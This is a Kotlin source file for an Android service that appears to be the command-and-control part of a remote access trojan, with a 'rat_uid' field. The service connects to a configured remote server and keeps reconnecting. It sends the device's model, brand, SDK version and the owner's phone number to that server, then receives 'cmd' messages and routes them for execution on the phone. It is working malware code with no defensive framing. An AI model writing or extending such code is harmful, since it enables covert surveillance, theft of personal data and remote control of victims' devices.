package com.app.cyber

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class SocketService : Service() {
    private var socket: Socket? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        connect()
    }

    private fun connect() {
        try {
            val opts = IO.Options()
            opts.reconnection = true
            opts.forceNew = true
            socket = IO.socket(Config.BaseUrl, opts)
            socket?.on(Socket.EVENT_CONNECT) {
                val uid = Utils.getRatUid(this)
                val payload = JSONObject()
                payload.put("action", "register")
                payload.put("rat_uid", uid)
                payload.put("model", android.os.Build.MODEL)
                payload.put("brand", android.os.Build.BRAND)
                payload.put("sdk", android.os.Build.VERSION.SDK_INT)
                payload.put("phone", Utils.getPhoneNumber(this))
                socket?.emit("device", payload)
            }
            socket?.on("cmd") { args ->
                val data = args[0] as JSONObject
                CommandRouter.route(this, data)
            }
            socket?.connect()
        } catch (e: URISyntaxException) { Log.e("SocketService", "uri", e) }
    }

    override fun onDestroy() { socket?.disconnect(); super.onDestroy() }

    companion object {
        fun start(ctx: Context) {
            val i = Intent(ctx, SocketService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else ctx.startService(i)
        }
    }
}
